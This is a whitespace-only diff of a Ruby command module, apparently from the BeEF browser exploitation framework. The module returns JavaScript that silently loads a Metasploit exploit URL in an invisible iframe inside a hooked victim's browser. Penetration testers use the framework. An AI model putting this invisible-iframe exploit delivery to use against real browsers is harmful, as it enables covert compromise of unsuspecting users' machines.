@@ -12,17 +12,17 @@ class Msf_module < BeEF::Core::Command
 	data = JSON.parse(command['data'])
 	sploit_url =  data[0]['sploit_url']
 
-      return "  
+      return "
 beef.execute(function() {
-        var result; 
+        var result;
 
-        try { 
+        try {
                 var sploit = beef.dom.createInvisibleIframe();
                 sploit.src = '#{sploit_url}';
-        } catch(e) { 
-                for(var n in e) 
-                        result+= n + ' '  + e[n] ; 
-        } 
+        } catch(e) {
+                for(var n in e)
+                        result+= n + ' '  + e[n] ;
+        }
 
 });"
         end
